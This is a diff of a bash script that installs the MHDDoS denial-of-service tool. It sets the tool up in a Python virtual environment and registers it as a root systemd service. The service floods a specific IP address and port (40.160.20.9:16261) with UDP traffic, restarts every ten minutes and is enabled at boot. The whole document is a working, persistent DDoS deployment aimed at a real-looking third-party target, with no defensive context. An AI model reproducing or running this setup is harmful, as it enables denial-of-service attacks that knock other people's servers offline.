@@ -1,44 +1,45 @@
-#!/bin/bash
+# 1. Ensure venv tool is installed (Critical Step)
+sudo apt update && sudo apt install python3-venv python3-pip git -y
 
-# 1. Update and install all necessary system tools
-sudo apt -y update
-sudo apt -y install curl wget libcurl4 libssl-dev python3 python3-pip make cmake \
-automake autoconf m4 build-essential git -y
+# 2. Go to the directory and wipe any broken venv
+cd /root/MHDDoS
+rm -rf venv
 
-# 2. Setup MHDDoS in the /root directory
-cd /root
-rm -rf MHDDoS
-git clone https://github.com/MatrixTM/MHDDoS.git
-cd MHDDoS/
+# 3. Create a fresh virtual environment
+python3 -m venv venv
 
-# 3. Install requirements (using the break-packages flag for modern Ubuntu)
-pip3 install -r requirements.txt --break-system-packages
+# 4. Install the requirements specifically into that venv
+./venv/bin/pip install --upgrade pip
+./venv/bin/pip install -r requirements.txt
+./venv/bin/pip install PyRoxy
 
-# 4. Create the systemd service file
-# Note: Using /usr/bin/python3 and absolute paths for stability
+# 5. Update the service file to point to the correct path
 cat <<EOF | sudo tee /etc/systemd/system/mhddos.service
 [Unit]
 Description=MHDDoS Service
 After=network.target
+StartLimitIntervalSec=0
 
 [Service]
 Type=simple
 User=root
 WorkingDirectory=/root/MHDDoS
-ExecStart=/usr/bin/python3 start.py UDP 40.160.20.9:16261 1000 99999999999
+ExecStart=/root/MHDDoS/venv/bin/python3 start.py UDP 40.160.20.9:16261 1000 99999999999
 Restart=always
-# This triggers the restart every 10 minutes
+RestartSec=3s
 RuntimeMaxSec=10min
 
 [Install]
 WantedBy=multi-user.target
 EOF
 
-# 5. Reload systemd, enable the service for boot, and start it now
+# 6. Reload and Kickstart
 sudo systemctl daemon-reload
 sudo systemctl enable mhddos.service
 sudo systemctl restart mhddos.service
 
 echo "------------------------------------------------"
-echo "MHDDoS is now set up and running."
-echo "Check logs with: journalctl -u mhddos.service -f"
+echo "Verification: Checking if venv exists now..."
+ls -l /root/MHDDoS/venv/bin/python3
+echo "------------------------------------------------"
+systemctl status mhddos.service
